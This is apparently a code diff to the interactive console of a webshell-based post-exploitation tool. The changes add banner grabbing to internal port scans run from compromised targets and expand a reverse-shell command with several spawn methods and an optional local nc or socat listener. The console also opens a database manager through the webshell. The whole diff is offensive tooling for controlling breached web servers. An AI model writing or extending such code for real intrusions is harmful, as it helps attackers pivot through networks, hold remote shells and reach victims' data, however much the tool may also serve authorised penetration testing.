@@ -169,17 +169,23 @@ class Repl(cmd2.Cmd):
 
     # -- pivots / shells -------------------------------------------------------
     def do_ps(self, _: cmd2.Statement) -> None:
-        """Port-scan a CIDR range from the target."""
+        """Port-scan a CIDR range from the target (optionally grabbing banners)."""
         hosts = self._ask("Hosts (CIDR)", "192.168.1.0/24")
         ports = self._ask("Ports", "21,22,80,443,445,3306,3389")
-        self._each(lambda ws: portscan.port_scan(ws, hosts, ports), "portscan")
+        banner = input("Grab banners? [y/N]: ").strip().lower() == "y"
+        self._each(lambda ws: portscan.port_scan(ws, hosts, ports, banner), "portscan")
 
     def do_rsh(self, _: cmd2.Statement) -> None:
-        """Spawn a reverse shell back to you (start your listener first)."""
+        """Spawn a reverse shell back to you (auto/socat/nc/bash/python/perl/php)."""
         ip = self._ask("Listener IP", get_ip_address())
         port = int(self._ask("Listener port", "8888"))
-        log.info(f"Listener hint: socat file:`tty`,raw,echo=0 tcp-l:{port}")
-        self._each(lambda ws: revshell.reverse_shell(ws, ip, port), "revshell")
+        method = self._ask("Method", "auto")
+        if input("Spawn a local listener here first? [y/N]: ").strip().lower() == "y":
+            tool = self._ask("Listener tool (nc/socat)", "nc")
+            revshell.reverse_shell_with_listener(self.webshells[0], ip, port, method, tool)
+        else:
+            log.info(f"Start your listener first, e.g.: nc -lvnp {port}")
+            self._each(lambda ws: revshell.reverse_shell(ws, ip, port, method), "revshell")
 
     def do_db(self, _: cmd2.Statement) -> None:
         """Open the database manager (MySQL or PostgreSQL) via the webshell."""
